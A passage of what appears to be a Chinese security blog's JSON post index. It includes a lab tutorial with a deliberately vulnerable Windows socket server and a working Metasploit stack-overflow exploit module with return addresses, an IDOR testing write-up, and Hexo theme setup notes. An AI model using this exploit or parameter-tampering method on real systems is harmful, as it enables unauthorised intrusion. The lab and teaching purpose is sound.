该工具主要用于机器代码与汇编代码之间的转换，但是局限也很明显，这只能用于x86的机器。 需要说明的是，这个编辑器功能强大，十分适合用户进行shellcode的编写。但实际上shellcode的编写一般速度很慢，所以也不一定非用这个不可！ C32asm这在吾爱破解工具包=&gt;反编译工具使用其 工具-&gt;汇编代码查询就目前而言，该功能只能从汇编代码转化为机器代码，所以局限性很强；而且一次只能转换一条指令。 OllyDbg当导入某一运行的程序之后，可以看到运行程序中每条指令的二进制代码以及对应的汇编代码。 当然，如果想要查看自己编写的汇编语言对应的机器代码，或者想找到机器代码对应的汇编语言，可以对主程序框中部分代码进行修改得到。 可能是了解的比较少，总觉得这么强大的调试工具应该会有十分实用的机器代码与汇编代码的转换工具，但是现在只是找到了上述所讲的那种笨办法！希望后续能够找到。。。","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"}]},{"title":"关于metasploit的EXITFUNC参数的解释","date":"2017-06-22T05:54:52.000Z","path":"2017/06/22/关于metasploit的EXITFUNC参数的解释/","text":"这个简单的介绍是从Google上搜的，当我们使用metasploit框架时经常会遇到EXITFUNC这个参数，这个参数是干什么用的呢？ EXITFUNC有4个不同的值：none，seh，thread和process。通常它被设置为线程或进程，它对应于ExitThread或ExitProcess调用。 “none”参数将调用GetLastError，实际上是无操作，线程然后将继续执行，允许您简单地将多个有效负载一起串行运行。在某些情况下，EXITFUNC是有用的，在利用一个exploit之后，我们需要一个干净地退出 SEH：This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs. 当存在结构化异常处理程序（SEH），且触发该SEH将自动重启线程或进程时，应使用此方法。 THREAD：This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application/system (clean exit) 此方法用于大多数场景，其中被利用的进程（例如IE）在子线程中运行shellcode并退出此线程会导致正在工作的应用程序/系统（清除退出）。 PROCESS：This method should be used with multi/handler. This method should also be used with any exploit where a master process restarts it on exit. 此方法应与multi/handler这个利用模块一起使用。此方法也应该与任何主进程在退出时会重新启动的漏洞一起使用。","tags":[{"name":"metasploit","slug":"metasploit","permalink":"http://yoursite.com/tags/metasploit/"}]},{"title":"查找动态链接库的API地址","date":"2017-06-22T05:10:12.000Z","path":"2017/06/22/查找动态链接库的API地址/","text":"1、开始之前为什么要获取动态链接库的API函数地址，这是为了方便测试时得到需要的函数，并通过该函数进行一系列的操作。而为了能够写出shellcode，需要的是这个动态链接库的API函数的地址，因而需要掌握获取API地址的方法。 2、使用OllyDbg获取动态链接库的API函数地址本文以获取动态链接库user32.dll中的MessageBoxA函数地址为例。 （1）首先使用OllyDbg打开一个使用了该动态链接库的PE程序其实包含user32.dll的程序有很多，大致上只要含有图形界面，就需要user32.dll这个动态链接库。我们以windows系统中最为常见的calc.exe为例(calc是计算器程序，很明显有界面；其存放在c:\\windows\\system32\\calc.exe) （2）使用OllyDbg的查看可执行模块的功能点击查看-&gt;可执行模块可以看到下面的界面 （3）点击user32.dll，右键点击查看名称 （4）找到MessageBoxA，并得到其对应的地址 3、使用C32asm获取动态链接库的API函数地址【该工具属于吾爱破解工具包=&gt;反编译工具】点击 工具-&gt;API地址查询毫无疑问，从简易程度来看，使用C32asm查询的速度更快，而且更为适合用户！！！","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"}]},{"title":"使用MSF发布POC","date":"2017-06-21T01:44:47.000Z","path":"2017/06/21/使用MSF发布POC/","text":"1、开始之前其实Metasploit一直是我想学习的安全工具，但是由于其功能实在太强大了，如果没有基础就开始使用，难免会有点因噎废食的感觉，所以我在学习《0day安全 软件漏洞分析技术》的过程中，做了些许CTF的逆向题，看了不少该类型题的writeup，最后才开始我的Metasploit学习之旅。 2、环境要求 推荐使用环境 备注 攻击者操作系统 Kali2.0 Kali主机上装有MSF，免去我们重新安装MSF的步骤 靶机操作系统 Win XP SP3 其他的windows操作系统也可以使用，但是exploit覆盖的函数返回地址会发生改变 靶机编辑器 Visual C++ 6.0 其他编辑器生成的PE文件也可以用于本实验，但是实验细节会发生改变 编译选项 默认编译选项 build版本 debug release版本也可以用于本实验，但是实验细节会发生改变 3、windows主机上存在漏洞的Server程序#include &quot;iostream&quot; #include &quot;winsock2.h&quot; #pragma comment(lib, &quot;ws2_32.lib&quot;) using namespace std; void msg_display(char* buf) { char msg[200]; strcpy(msg, buf); //overflow here, copy 0x200 to 200 cout&lt;&lt;&quot;*****************************&quot;&lt;&lt;endl; cout&lt;&lt;&quot;received:&quot;&lt;&lt;endl; cout&lt;&lt;msg&lt;&lt;endl; } void main() { int sock, msgsock, length, receive_len; struct sockaddr_in sock_server, sock_client; char buf[0x200]; // noticed it is 0x200 WSADATA wsa; WSAStartup(MAKEWORD(1,1), &amp;wsa); if((sock=socket(AF_INET, SOCK_STREAM, 0))&lt;0) { cout&lt;&lt;sock&lt;&lt;&quot;sock creating error!&quot;&lt;&lt;endl; exit(1); } sock_server.sin_family=AF_INET; sock_server.sin_port=htons(7777); sock_server.sin_addr.s_addr=htonl(INADDR_ANY); if(bind(sock, (struct sockaddr*)&amp;sock_server, sizeof(sock_server))) { cout&lt;&lt;&quot;binding target server 1.0 &quot;&lt;&lt;endl; } cout&lt;&lt;&quot;*****************************************************&quot;&lt;&lt;endl; cout&lt;&lt;&quot; exploit target server 1.0 &quot;&lt;&lt;endl; cout&lt;&lt;&quot;*****************************************************&quot;&lt;&lt;endl; listen(sock, 4); length = sizeof(struct sockaddr); do{ msgsock = accept(sock, (struct sockaddr*)&amp;sock_client, (int *)&amp;length); if(msgsock==-1) { cout&lt;&lt;&quot;accept error!&quot;&lt;&lt;endl; break; } else do { memset(buf, 0, sizeof(buf)); if((receive_len=recv(msgsock, buf, sizeof(buf), 0))&lt;0) { cout&lt;&lt;&quot;reading stream message error!&quot;&lt;&lt;endl; receive_len = 0; } msg_display(buf); //trigged the overflow }while(receive_len); closesocket(msgsock); }while(1); WSACleanup(); } 4、开发exploit4.1 Ruby开发exploit的正常结构class xxx def initialize #定义模块初始化信息。如漏洞使用的操作系统平台、为不同操作系统指明不同的返回地址 #指明shellcode中禁止出现的特殊字符、漏洞相关的描述、URL引用、作者信息等 end def exploit #将填充物、返回地址、shellcode等组织成最终的attack_buffer，并发送 end end 4.2 Ruby开发“傻瓜式”Exploit#!/usr/bin/env ruby require &apos;msf/core&apos; # it is similar to &apos;include&apos; in C language class Metasploit3 &lt; Msf::Exploit::Remote include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, &apos;Name&apos;=&gt;&apos;failwest_test&apos;, &apos;Platform&apos;=&gt;&apos;win&apos;, &apos;Targets&apos; =&gt; [ [ &apos;Windows 2000&apos;,{ &apos;Ret&apos; =&gt; 0x77F8948B } ], [ &apos;Windwos xp sp2&apos;,{ &apos;Ret&apos; =&gt; 0x7C914393 } ], [ &apos;Windwos xp sp3&apos;,{ &apos;Ret&apos; =&gt; 0x7c86467b} ], ], &apos;Payload&apos; =&gt; { &apos;Space&apos; =&gt; 300, &apos;BadChars&apos; =&gt; &apos;\\x00&apos;, &apos;StackAdjustment&apos; =&gt; -3500, })) end def exploit connect attack_buf = &apos;a&apos;*204 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded sock.put(attack_buf) handler disconnect end end require指明所需的类库，相当于C语言中的include。所有的MSF模块都需要这句话。运算符&quot;&lt;&quot;在这里表示继承，也就是说，我们所定义的类是由Msf::Exploit::Remote继承而来，可以方便地使用父类的资源。 在类中只定义了两个方法（函数），一是initialize，另一个是exploit。可见为MSF开发模块的过程其实就是实现这两个方法的过程。initialize方法的实现非常简单，在某种意义上更像是在“填空”。从代码中可以看到，initialize实际上值调用了一个方法update_info来初始化info数据结构。初始化的过程通过一系列hash操作完成。(1) Name模块的名称，MSF通过这个名称来引用本模块(2) Platform模块运行平台，MSF通过这个值来为exploit挑选payload。本例中，该值为&quot;win&quot;，所以MSF只选用windows平台的payload，BSD和Linux的payload将被禁用。(3) Targets可以定义多种操作系统版本中的返回地址，本例中定义了Windows2000、Windows XP SP2、Windows XP SP3三种，跳转指令选用了jmp esp，均来自kernel32.dll。本实验时您可能需要根据实验环境重新确定这个值。(4) Payload对shellcode的要求，如大小和禁止使用的字节等。由于漏洞函数使用strcpy函数，故字符结束符0x00应该被禁用。MSF会根据这里的设置自动选用编码算法对shellcode进行加工以满足测试要求。 exploit的定义各位简单。需要说明的只有 attack_buf = &#39;a&#39;*204 + [target[&#39;Ret&#39;]].pack(&#39;V&#39;) + payload.encoded首先选用204个字母&#39;a&#39;填充缓冲区。pack(&#39;V&#39;)的作用时把数据按照DWORD逆序。填充了缓冲区和返回地址后，再选上经过编码的shellcode，就得到最终的attack_buf。其中，payload.encoded会在使用时由MSF提示我们手工设置并生成。 4.3 获取返回地址和覆盖返回地址一眼望去，我们仿佛就知道覆盖的函数返回地址是在第200个字节之后，但这是不对的。对于书上给出的exploit，attack_buf = &#39;a&#39;*200 + [target[&#39;Ret&#39;]].pack(&#39;V&#39;) + payload.encoded，但是实验结果并不能复现，所以我们猜测要么是返回地址弄错了，要么就是没有真正覆盖返回地址。 获取返回地址：（1）将windows XP sp3中的kernel32.dll(c:\\windows\\system32\\kernel32.dll)拷贝至kali(/root/Desktop/kernel32.dll)系统（2）使用msfpescan查看jmp esp所在的地址。 从图中可以看出jmp esp所在的地址就是0x7c86467b 覆盖返回地址如何发现覆盖的是否是返回地址，就需要对地址一个调试工具了。这里可以使用windbg，也可以使用OllyDbg，为了方便就使用windbg。 （1）首先在windows xp sp2用windbg打开Server服务程序，启动7777端口。（2）在Kali 2.0上生成有序的定长字符串，这儿使用的是msf的工具pattern_create # /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1000 &gt; /root/Desktop/hi.txt （3）在Kali 2.0上连接Windows xp sp2(ip地址为192.168.124.132)上的Server服务器 # cat /root/Desktop/hi.txt | nc 192.168.124.132 7777 （4）在windows xp sp2上查看被覆盖的地址，可以从eip上查看 （5）在Kali 2.0上使用msf工具pattern_offset获取地址偏移 所以最终可以确定，当字符串长度大于204个字节的时候，从第204个字节开始，后4个字节覆盖了该函数的返回地址 综合编写exploit综合上述找到的返回地址以及覆盖返回地址时前面需要字符串长度，最后可以得到以下几个部分: &apos;Targets&apos; =&gt; [ [ &apos;Windows 2000&apos;,{ &apos;Ret&apos; =&gt; 0x77F8948B } ], [ &apos;Windwos xp sp2&apos;,{ &apos;Ret&apos; =&gt; 0x7C914393 } ], [ &apos;Windwos xp sp3&apos;,{ &apos;Ret&apos; =&gt; 0x7c86467b} ], ], attack_buf = &apos;a&apos;*204 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded 5、测试结果 参考文献《0day安全 软件漏洞分析技术》2012西电网络攻防大赛 溢出第三题 调试笔记","tags":[{"name":"metasploit","slug":"metasploit","permalink":"http://yoursite.com/tags/metasploit/"}]},{"title":"hexo通用配置","date":"2017-06-20T07:26:47.000Z","path":"2017/06/20/hexo通用配置/","text":"开始之前当确定使用Hexo这种静态博客，并使用前面几篇博客所说明的几种安装配置方法之后，基本上自己的博客就已经能够使用了。但是如何解决细节方面的问题呢？这一节就是专门解决这方面问题所开设的博文，博文将会根据自身遇见的问题以及评论者遇到的问题进行汇总整理，不断更新以确保问题能够及时得到解决！ 1. hexo文章中如何插入图片解决这个问题前，首先得了解Hexo的结构。 可以看出source目录是创建博文所需要的基本文件，那么可想而知图片也应该放到这个文件夹下。 使用本地路径：在hexo/source目录下新建一个images文件夹，将图片放入该文件夹下，插入图片时链接即为/images/图片名称。 使用微博图床，地址http://weibotuchuang.sinaapp.com/，将图片拖入区域中，会生成图片的URL，这就是链接地址。 毫无疑问推荐使用第一种方法，而markdown引用图片的方法： ![Alt text](/path/to/img.jpg) 2. hexo如何分享bluelake主题十分友好的是将这些内容封装起来，用户只需要在themes/bluelake/_config.yml中进行配置即可！ 相关代码是： #Share baidu_share: ## 百度分享 JiaThis_share: ##true ##JiaThis分享 duoshuo_share: #true ##true 多说分享必须和多说评论一起使用。 addToAny_share: # AddToAny share. Empty list hides. List items are service name at url. For ex: email for &apos;&lt;a href=&quot;https://www.addtoany.com/add_to/email?linkurl=...&apos; # - twitter # - baidu # - facebook # - google_plus # - linkedin # - email # - qzone # - wechat # - sina_weibo 如果想启用百度分享（包括facebook、twitter、linkedin、有道云笔记、印象笔记、微信、QQ空间、sina微薄），就只需要在baidu_share设置为true就行。 如果想启用JiaThis分享或者多说分享，都是类似的操作，但是问题是这些分享貌似都不可用！ 所以笔者采用的是addToAny_share这种方式，这时候只需要将取消上面的特定注释即可。而如果大家还想添加其他类型的分享，也可以使用下面的办法：首先访问网站https://www.addtoany.com/share#url=https%3A%2F%2Fwww.addtoany.com%2F 然后画面中会出现下列分享位置 点击某个想分享的地址后，页面会出现类似https://www.addtoany.com/add_to/wechat?url=..... 大家只需要将add_to/后的名字填到addToAny_share后面即可，注意使用yaml语法，也即空两格，横线，空格，分享名","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"hexo的目录结构","date":"2017-06-20T02:37:13.000Z","path":"2017/06/20/hexo的目录结构/","text":"由于上一篇博文的要求，所以需要整理一下hexo的目录结构，了解hexo每个目录的作用，并且设置全局配置文件 _config.yml 的相关参数，初步定义属于你自己的博客。 1.主目录结构主目录，简洁明了 |-- _config.yml |-- package.json |-- scaffolds |-- scripts |-- source |-- _drafts |-- _posts |-- themes 2.主目录介绍_config.yml全局配置文件，网站的很多信息都在这里配置，诸如网站名称，副标题，描述，作者，语言，主题，部署等等参数。这个文件下面会做较为详细的介绍。 package.jsonhexo框架的参数，如果不小心把它删掉了，没关系，新建一个文件，将内容写入文件，保存就OK了。里面的参数基本上是固定的，如下： { &quot;name&quot;: &quot;hexo-site&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;private&quot;: true, &quot;hexo&quot;: { &quot;version&quot;: &quot;3.3.7&quot; }, &quot;dependencies&quot;: { &quot;hexo&quot;: &quot;^3.2.0&quot;, &quot;hexo-deployer-git&quot;: &quot;^0.3.0&quot;, &quot;hexo-generator-archive&quot;: &quot;^0.1.4&quot;, &quot;hexo-generator-baidu-sitemap&quot;: &quot;^0.1.2&quot;, &quot;hexo-generator-category&quot;: &quot;^0.1.3&quot;, &quot;hexo-generator-feed&quot;: &quot;^1.2.0&quot;, &quot;hexo-generator-index&quot;: &quot;^0.2.0&quot;, &quot;hexo-generator-json-content&quot;: &quot;^2.2.0&quot;, &quot;hexo-generator-sitemap&quot;: &quot;^1.2.0&quot;, &quot;hexo-generator-tag&quot;: &quot;^0.2.0&quot;, &quot;hexo-renderer-ejs&quot;: &quot;^0.2.0&quot;, &quot;hexo-renderer-jade&quot;: &quot;^0.4.1&quot;, &quot;hexo-renderer-marked&quot;: &quot;^0.2.10&quot;, &quot;hexo-renderer-stylus&quot;: &quot;^0.3.3&quot;, &quot;hexo-server&quot;: &quot;^0.2.0&quot; } } 参数也很容易理解，一看就明白，该文件基本上也不需要操作，就不多解释了。 scaffoldsscaffolds是“脚手架、骨架”的意思，当你新建一篇文章（hexo new &#39;title&#39;）的时候，hexo是根据这个目录下的文件进行构建的。基本不用关心。一般而言会有三个不同的选择，分别是draft、post、page三个模板，其中可以自定义需要的项目： --- title: {{ title }} date: {{ date }} categories: tags: --- scripts脚本目录，此目录下的JavaScript文件会被自动执行。 source这个目录很重要，新建的文章都是在保存在这个目录下的，有两个子目录： _drafts ， _posts 。需要新建的博文都放在 _posts 目录下。 _posts 目录下是一个个 markdown 文件。你应该可以看到一个 hello-world.md 的文件，文章就在这个文件中编辑。 _posts 目录下的md文件，会被编译成html文件，放到 public （此文件现在应该没有，因为你还没有编译过）文件夹下。 themes网站主题目录，hexo有非常好的主题拓展，支持的主题也很丰富。该目录下，每一个子目录就是一个主题，我的子目录如下： |-- landscape |-- |-- BlueLake |-- 我装了两个主题， landscape 是我这个hexo版本的默认主题，我自己下载了一个 BlueLake 主题。 你也可以自己下载主题放到该文件下， hexo主题传送门 主题目录下我们可以进行很多自定义的操作，诸如，给网站添加微博秀、添加评论组件、添加分享组件、添加统计等等，让自己的博客网站更丰富、有趣、实用。 themes目录结构及优化自己的博客，这些内容我会在下一篇博文中介绍。 node_module这个目录下存放是通过nodejs下载的相应的hexo插件。 4.后记 好了，本地运行一下 hexo server浏览器访问 localhost:4000/ ，网站的标题，副标题等信息是不是都已经更改了！恭喜你，对自己的博客网站的简单的全局设置已经成功了。","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]},{"title":"聊聊越权那些事儿","date":"2017-06-19T12:37:27.000Z","path":"2017/06/19/聊聊越权那些事儿/","text":"前言最近在帮合作单位做渗透测试，这是我入行以来第一次参与正式项目。怀着激动而忐忑的心情测了两周，我一共发现了十几个漏洞，其中大部分还都是高危漏洞。终于没有交白卷，忐忑的心情终于放下，现在心里只剩一点小激动，一点成就感。渗透测试是一个既需要技术，又需要经验的活儿。思来想去，趁现在兴奋劲儿还没过，赶紧做一下总结，毕竟经验是通过实战积累的，而实战之后的总结则是最好的方式。由于在测试中发现的漏洞以“越权”类居多，而且本人的人生中提交的第一个漏洞也是越权，所以这里就先聊聊越权的那些事儿。 什么是越权越权（或者说权限提升，Privilege Escalation）是指攻击者能够执行他本身没有资格执行的一些操作，属于“访问控制”的问题。用大白话讲，越权就是“超越了你你拥有的权限，干了你本来不可能干的事儿”。先来几个越权的例子： Winmail普通用户可直接进入后台取得域名管理、用户管理等所有权限 前程无忧越权访问个人简历（简单测试上万份简历可查看） 易企秀越权修改信息致任意用户登入 一般情况下，常见的访问控制方式有三种：垂直访问控制、水平访问控制和上下文相关的访问控制。垂直访问控制允许不同类型的用户（常见的有基于角色划分用户类型）访问应用程序的不同功能，例如在某系统中普通用户只能执行有限的操作，管理员则拥有最高权限。水平访问控制允许用户访问一组相同类型的资源，如在一个网银系统中，每个用户只能看到他自己的账户信息，只能操作自己的账户进行转账。而上下文相关的访问控制可确保基于应用程序当前的状态，限制用户仅能访问所允许的内容，如在常见的找回/修改密码功能中，必须通过身份验证才能重新设置密码。许多情况下，垂直访问控制与水平访问控制会相交交叠，配合使用。 如果在一个应用中，用户能够访问他本身无权访问的功能或者资源，就说明该应用存在访问控制缺陷，也就是说存在越权漏洞。与访问控制相对应的，将越权分为垂直越权、水平越权和上下文相关的越权。 垂直越权：如果攻击者能够执行某项功能，而他所属的角色并不具备该权限，这就存在垂直越权漏洞，如上述示例中前两个例子。水平越权：如果攻击者能够执行与自己同级别的其他用户能够执行的操作，这就存在水平越权漏洞，如上述示例中的后两个例子。上下文相关的越权：如果攻击者能够利用应用程序状态机中的漏洞获得关键资源的访问权限，这就存在上下文相关的越权。如在找回密码过程中，攻击者使用自己的账户信息通过验证，但最终却通过某种手段（例如使用BurpSuite改数据包）将他人的密码进行了修改。上下文相关的越权漏洞一般属于业务逻辑漏洞。为什么会出现越权通常情况下，我们使用一个web应用程序提供的功能时，流程是：登录—&gt;提交请求—&gt;验证权限—&gt;数据库查询—&gt;返回结果。如果在“验证权限”环节存在缺陷，那么便会导致越权。一种常见的存在越权的情形是：Web应用程序的开发者安全意识不足，认为通过登录即可验证用户的身份，而对用户登录之后的操作不做进一步的权限验证，进而导致越权问题。 1. 通过隐藏URL实现访问控制有些应用程序仅通过URL实现访问控制。例如：使用管理员身份登录后可以看到后台管理页面的链接，但是以普通用户登录则看不到该链接。在这种情况下，开发者认为普通用户不知道或者很难猜到后台管理页面的URL，因此实现对管理功能的保护。这其实是一种错误观点，因为攻击者完全有可能通过其他方式（如Google Hacking、HTML/js源码分析、暴力猜解URL、利用其他漏洞等）得到后台管理URL。 2. 直接对象引用（Direct Object reference）用户提交HTTP请求访问某资源时，被请求资源的标识符常常以GET或者POST请求参数的形式出现在URL查询字符串或者POST请求主体中提交给服务器。例如，在一个网银系统中，用户可以使用以下URL查询账户信息：https://www.onlinebank.com/viewInfo.php?accountId=12345678 其中accountId是用户自己的账户ID。用户登录自己的账户后，该URL的链接会出现在用户账户页面中，用户点击即可跳转到账户信息页面。虽然其他用户无法看到这个链接，但是如果该网银系统的访问控制不完善，攻击者完全可以通过枚举accountId进而构造出URL，然后越权查看他人的账户信息。 3. 多阶段功能应用程序的一些功能通过几个阶段执行，并且在执行过程中向服务器依次提交多个请求。这种情况很常见，比如转账功能、找回密码功能等，需要先验证用户的身份，验证通过后才允许用户执行后续动作。多阶段功能本身并没有问题，但是如果开发者认为到达验证过程后续阶段的用户一定已经拥有了相关的权限，并在后续阶段执行操作时不再对用户提交的请求进行验证，那么就很有可能存在越权漏洞。攻击者完全有可能绕过前几阶段的验证阶段，直接执行后续的动作。讲一个我在测试中遇到的真实的案例。 某网站在找回密码时做了很严格的验证，需要验证姓名、手机号、身份证号等信息，验证通过了才能修改密码。那么问题来了，既然做了这么严格的验证，怎么还会存在越权？该网站的“找回密码”功能被设计成了两步（提交了两个请求报文）：第一步验证用户身份，这时提交第一个请求报文，验证成功之后，进入第二步；第二步才是真正的修改密码的动作，而修改密码的POST数据包有3个请求参数，分别是新密码、确认新密码以及账号值。问题就出在第二步，在执行修改密码的动作时，服务器并未验证被修改密码的账户是否是第一步中通过身份验证的账户，因此攻击者可以很容易的以自己的身份通过认证，然后修改第二步提交的报文，实现对任意账户的密码修改！ 4. 静态文件有些Web应用程序在用户访问动态页面时会执行相应的访问控制检查，以确定用户是否拥有执行相关操作所需的权限。但是，用户仍然会提交对静态资源的访问请求，如下载网站中的word、excel、pdf文档等。这些文档都是完全静态的资源，其内容直接由Web服务器返回，它并不在服务器上运行。因此，静态资源自身并不能执行任何检查以确认用户的访问权限。如果这些静态资源没有得到有效的保护，那么任何知晓URL命名规则的人都可以越权访问这些静态资源。这种情况的越权也很常见，而且即使不知道URL命名规则，完全有可能通过Google hacking搜索到敏感文件。 5. 平台配置错误一些应用程序通过在Web服务器或应用程序平台层使用控件来控制对特定URL路径的访问。例如，有些应用程序会根据用户角色来限制对管理后台路径（如/admin）的访问，如果用户不属于“管理员”组，则拒绝其访问后台管理页面的请求。但是，如果在配置平台及控件时出现错误，就可能导致越权访问。 越权漏洞怎么挖首先，找出疑似存在越权漏洞的请求。存在越权漏洞的请求有一定的特点，可以从两个方面下手。 从HTTP请求上来说，就是通过BurpSuite抓取在目标站点正常操作所产生的请求数据包，然后找出可能产生越权的请求。一般情况下，类似上文所述URL的GET或者POST请求都要列为重点怀疑对象：https://www.onlinebank.com/viewInfo.php?accountId=12345678 从业务功能上来说，找到容易产生越权的功能点。常见的越权高发功能点有：根据订单号查订单、根据用户ID查看帐户信息、修改/找回密码等。 确定了怀疑对象之后，还需要进一步的分析，以确定是否真的存在越权。这时，需要两个不同的账号（下文分别称为账号A和账号B），以便测试登录账号A后进行操作能否影响到账号B。注意在浏览器中测试时，需要使用两个浏览器分别登录不同的账号，或者使用浏览器的隐私浏览功能登录其中一个账号。 以上文提到的URL为例进行说明。假设账号A的id为1234，账号B的id为5678，BurpSuite中抓取的数据包都是在账号A的。我的习惯做法是：在BurpSuite中将该请求发送到Repeater，然后将参数id的值修改为5678，最后提交修改后的请求包；服务器返回响应后，可以看一下BurpSuite中收到的响应报文。如果响应报文直接提示错误之类的，基本上可以确定此处不存在越权；如果响应报文提示操作成功，此时应该使用浏览器登录账号B进行二次确认，如果数据确实有相应的改动，那么则说明这里存在越权漏洞。这里需要注意：BurpSuite中报文提示操作成功有可能是误报，必须在浏览器中进行再次确认。而对于查询订单这类的请求来说，情况更简单了，修改参数id提交请求，如果返回了账号B的数据，那么就可以确定存在越权。 当然，越权漏洞的攻击点不仅仅存在于请求参数中，还有可能在Cookie中。因此，需要具体情况具体分析，复杂一点的可能还需要Cookie值配合请求参数值以实现越权攻击。 总结实现应用程序的完善的访问控制不是件容易的事，因此越权漏洞防不胜防。对于开发者而言，一定要有安全意识，时刻保持警惕。以下是几点建议： 永远不要相信来自客户端（用户）的输入！ 执行关键操作前必须验证用户身份，多阶段功能的每一步都要验证用户身份。 对于直接对象引用，加密资源ID，以防止攻击者对ID进行枚举。 在前端实现的验证并不可靠，前端可以验证用户的输入是否合规，在服务器端验证用户权限。 参考文献黑客攻防技术宝典：Web实战篇（第2版） 我的越权之道 What is privilege escalation Direct Object References and Horizontal Privilege Escalation 本文参考转载至文章聊聊越权那些事儿","tags":[{"name":"越权","slug":"越权","permalink":"http://yoursite.com/tags/越权/"}]},{"title":"BlueLake博客主题的详细配置","date":"2017-06-17T15:51:24.000Z","path":"2017/06/17/BlueLake博客主题的详细配置/","text":"开始之前BlueLake主题是github作者chaooo写的一个主题，上面经常会有楼层问一些配置的问题，这篇博文主要也是为了解决这些问题。主题以简洁轻量自居(实则简陋)，去掉了Jquery和Fancybox,用原生JS实现站内搜索功能和回到顶部效果。这个主题只是一个小小的雏形，期待您来帮助它成长。 在阅读本文之前，假定您已经成功安装了Hexo，并使用 Hexo 提供的命令创建了一个静态博客。Hexo是一个快速、简洁且高效的博客框架。Hexo基于Node.js ，使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 需要特别注意的是Hexo有两个_config.yml配置文件，一份位于站点根目录下，主要包含 Hexo 站点本身的配置，下文中会称为根_config.yml；另一份位于主题目录下（themes/主题名/_config.yml），这份配置由主题作者提供，主要用于配置主题相关的选项,下文中会称为主题_config.yml。 1. 安装您可以直接到BlueLake发布页下载，然后解压拷贝到themes目录下，修改配置即可。不过我还是推荐使用GIT来checkout代码，之后也可以通过git pull来快速更新。 1.1 安装主题在根目录下打开终端窗口： git bash1$ git clone https://github.com/chaooo/hexo-theme-BlueLake.git themes/BlueLake 1.2 安装主题渲染器BlueLake是基于jade和stylus写的，所以需要安装hexo-renderer-jade和hexo-renderer-stylus来渲染。git bash12$ npm install hexo-renderer-jade --save$ npm install hexo-renderer-stylus --save 1.3 启用主题打开根_config.yml配置文件，找到theme字段，将其值改为BlueLake(先确认主题文件夹名称是否为BlueLake)。根_config.yml_config.yml1theme: BlueLake 1.4 验证首先启动 Hexo 本地站点，并开启调试模式：git bash1$ hexo s --debug 在服务启动的过程，注意观察命令行输出是否有任何异常信息，如果你碰到问题，这些信息将帮助他人更好的定位错误。 当命令行输出中提示出：INFO Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.此时即可使用浏览器访问 http://localhost:4000，检查站点是否正确运行。 1.5 更新主题今后若主题添加了新功能正是您需要的，您可以直接git pull来更新主题。git bash12cd themes/BlueLakegit pull 2. 配置2.1 配置网站头部显示文字打开根_config.yml，找到：根_config.yml_config.yml1234title: subtitle: description: author: title和subtitle分别是网站主标题和副标题，会显示在网站头部；description在网站界面不会显示，内容会加入网站源码的meta标签中，主要用于SEO；author就填写网站所有者的名字，会在网站底部的Copyright处有所显示。 2.2 设置语言该主题目前有七种语言：简体中文（zh-CN），繁体中文（zh-TW），英语（en），法语（fr-FR），德语（de-DE），韩语 （ko）,西班牙语（es-ES）；例如选用简体中文，在根_config.yml配置如下：根_config.yml_config.yml1language: zh-CN 2.3 设置菜单打开主题_config.yml，找到：主题_config.ymlthemes/BlueLake/_config.yml12345678910111213menu: - page: home directory: . icon: fa-home - page: archive directory: archives/ icon: fa-archive # - page: about # directory: about/ # icon: fa-user - page: rss directory: atom.xml icon: fa-rss 主题默认是展示四个菜单，即主页home，归档archive，关于about，订阅RSS；about需要手动添加，RSS需要安装插件，若您并不需要，可以直接注释掉。每个页面底部的footer中联系博主的三个图标分别是邮箱，微博主页链接地址，GitHUb个人页链接地址，直接使用主题_config.yml中about页面的配置，若不需要about页面，只需要如下配置就好：主题_config.ymlthemes/BlueLake/_config.yml12345# About page about: email: ## 个人邮箱 weibo_url: ## 微博主页链接地址 github_url: ## github主页链接地址 2.3.1 添加about页此主题默认page页面是关于我页面的布局，在根目录下打开命令行窗口，生成一个关于我页面：git bash1$ hexo new page &#39;about&#39; 打开主题_config.yml，补全关于我页面的详细信息：主题_config.ymlthemes/BlueLake/_config.yml12345678# About page about: photo_url: ## 头像的链接地址 email: ## 个人邮箱 weibo_url: ## 微博主页链接地址 weibo_name: ## 微博用户名 github_url: ## github主页链接地址 github_name: ## github用户名 当然您也可以自定义重新布局about页面，只需要修改layout/page.jade模板就好。 2.3.2 安装 RSS(订阅) 和 sitemap(网站地图) 插件在根目录下打开命令行窗口：git bash123$ npm install hexo-generator-feed --save$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save 添加主题_config.yml配置：主题_config.ymlthemes/BlueLake/_config.yml1234567891011121314Plugins: hexo-generator-feed hexo-generator-sitemap hexo-generator-baidu-sitemapfeed: type: atom path: atom.xml limit: 20sitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xml 2.4 添加本地搜索默认本地搜索是用原生JS写的，但还需要HEXO插件创建的JSON数据文件配合。安装插件hexo-generator-json-content来创建JSON数据文件：git bash1$ npm install hexo-generator-json-content@2.2.0 --save 然后在根_config.yml添加配置：根_config.yml_config.yml123456789101112131415161718jsonContent: meta: false pages: false posts: title: true date: true path: true text: true raw: false content: false slug: false updated: false comments: false link: false permalink: false excerpt: false categories: false tags: true 最后在主题_config.yml添加配置：主题_config.ymlthemes/BlueLake/_config.yml1local_search: true 2.5 修改站点图标站点图标存放在主题的Source目录下，已经默认为您准备了两张图片。您也可以自己设计站点LOGO。您需要准备一张ico格式并命名为 favicon.ico ，请将其放入hexo目录的source文件夹，建议大小：32px X 32px。您需要为苹果设备添加网站徽标，请命名为 apple-touch-icon.png 的图像放入hexo目录的“source”文件夹中，建议大小为：114px X 114px。(有很多网站都可以在线生成ico格式的图片。) 2.6 